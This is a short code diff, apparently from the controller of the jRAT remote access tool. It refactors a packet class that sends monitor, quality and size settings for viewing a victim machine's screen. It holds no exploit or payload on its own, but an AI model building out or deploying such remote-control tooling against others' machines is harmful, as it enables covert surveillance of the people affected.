@@ -2,8 +2,6 @@ package jrat.controller.packets.outgoing;
 
 import jrat.controller.Slave;
 
-import java.io.DataOutputStream;
-
 
 public class Packet50UpdateRemoteScreen extends AbstractOutgoingPacket {
 	
@@ -18,10 +16,10 @@ public class Packet50UpdateRemoteScreen extends AbstractOutgoingPacket {
 	}
 
 	@Override
-	public void write(Slave slave, DataOutputStream dos) throws Exception {
-		dos.writeInt(monitor);
-		dos.writeInt(quality);
-		dos.writeInt(size);
+	public void write(Slave slave) throws Exception {
+		slave.writeInt(monitor);
+		slave.writeInt(quality);
+		slave.writeInt(size);
 	}
 
 	@Override
